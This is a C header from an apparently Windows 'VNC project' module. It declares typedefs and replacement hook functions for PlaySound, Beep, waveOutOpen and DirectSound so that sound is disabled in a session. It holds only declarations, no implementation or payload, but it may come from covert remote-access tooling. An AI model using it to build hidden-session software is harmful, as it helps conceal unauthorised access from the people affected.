//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: sound.c
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	hooks to disable sound in session

#ifndef __SOUND_H_
#define __SOUND_H_

typedef BOOL (WINAPI *ptr_PlaySoundA)(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound);
typedef BOOL (WINAPI *ptr_PlaySoundW)(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound);
typedef BOOL (WINAPI *ptr_Beep)(DWORD dwFreq,DWORD dwDuration);
typedef BOOL (WINAPI *ptr_MessageBeep)(UINT uType);
typedef BOOL (WINAPI *ptr_sndPlaySoundW)(LPCWSTR pszSound,UINT fuSound);
typedef BOOL (WINAPI *ptr_sndPlaySoundA)(LPCSTR pszSound,UINT fuSound);
typedef MMRESULT (WINAPI *ptr_waveOutOpen)(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen);

//////////////////////////////////////////////////////////////////////////
// direct sound
typedef HRESULT (WINAPI *ptr_DirectSoundCreate)(PVOID lpGuid, PVOID ppDS, PVOID  pUnkOuter );
typedef HRESULT (WINAPI *ptr_DirectSoundCaptureCreate)( PVOID lpGuid, PVOID ppDS, PVOID  pUnkOuter );
typedef HRESULT (WINAPI *ptr_DirectSoundFullDuplexCreate8)(
	PVOID pcGuidCaptureDevice,
	PVOID pcGuidRenderDevice,
	PVOID pcDSCBufferDesc,
	PVOID pcDSBufferDesc,
	HWND hWnd,
	DWORD dwLevel,
	PVOID * ppDSFD,
	PVOID * ppDSCBuffer8,
	PVOID * ppDSBuffer8,
	PVOID pUnkOuter
	);
typedef HRESULT (WINAPI *ptr_DirectSoundFullDuplexCreate)(
	PVOID pcGuidCaptureDevice,
	PVOID pcGuidRenderDevice,
	PVOID pcDSCBufferDesc,
	PVOID pcDSBufferDesc,
	HWND hWnd,
	DWORD dwLevel,
	PVOID * ppDSFD,
	PVOID * ppDSCBuffer8,
	PVOID * ppDSBuffer8,
	PVOID pUnkOuter
	);
typedef HRESULT (WINAPI *ptr_DirectSoundCreate8)( PVOID lpcGuidDevice, PVOID * ppDS8, PVOID pUnkOuter );
typedef HRESULT (WINAPI *ptr_DirectSoundCaptureCreate8)( PVOID lpcGUID, PVOID * lplpDSC, PVOID pUnkOuter );

//////////////////////////////////////////////////////////////////////////
// FORWARD DECLARATIONS

BOOL WINAPI my_PlaySoundA(LPCSTR pszSound,HMODULE hmod,DWORD fdwSound);
BOOL WINAPI my_PlaySoundW(LPCWSTR pszSound,HMODULE hmod,DWORD fdwSound);
BOOL WINAPI my_Beep(DWORD dwFreq,DWORD dwDuration);
BOOL WINAPI my_MessageBeep(UINT uType);
BOOL WINAPI my_sndPlaySoundW(LPCWSTR pszSound,UINT fuSound);
BOOL WINAPI my_sndPlaySoundA(LPCSTR pszSound,UINT fuSound);
MMRESULT WINAPI my_waveOutOpen(LPHWAVEOUT phwo,UINT_PTR uDeviceID,LPWAVEFORMATEX pwfx,DWORD_PTR dwCallback,DWORD_PTR dwCallbackInstance,DWORD fdwOpen);


//////////////////////////////////////////////////////////////////////////
// direct sound
HRESULT WINAPI my_DirectSoundCreate(PVOID lpGuid, PVOID ppDS, PVOID  pUnkOuter );
HRESULT WINAPI my_DirectSoundCaptureCreate( PVOID lpGuid, PVOID ppDS, PVOID  pUnkOuter );
HRESULT WINAPI my_DirectSoundFullDuplexCreate8(
	PVOID pcGuidCaptureDevice,
	PVOID pcGuidRenderDevice,
	PVOID pcDSCBufferDesc,
	PVOID pcDSBufferDesc,
	HWND hWnd,
	DWORD dwLevel,
	PVOID * ppDSFD,
	PVOID * ppDSCBuffer8,
	PVOID * ppDSBuffer8,
	PVOID pUnkOuter
	);

HRESULT WINAPI my_DirectSoundFullDuplexCreate(
	PVOID pcGuidCaptureDevice,
	PVOID pcGuidRenderDevice,
	PVOID pcDSCBufferDesc,
	PVOID pcDSBufferDesc,
	HWND hWnd,
	DWORD dwLevel,
	PVOID * ppDSFD,
	PVOID * ppDSCBuffer8,
	PVOID * ppDSBuffer8,
	PVOID pUnkOuter
	);

HRESULT WINAPI my_DirectSoundCreate8( PVOID lpcGuidDevice, PVOID * ppDS8, PVOID pUnkOuter );
HRESULT WINAPI my_DirectSoundCaptureCreate8( PVOID lpcGUID, PVOID * lplpDSC, PVOID pUnkOuter );

#endif // __SOUND_H_
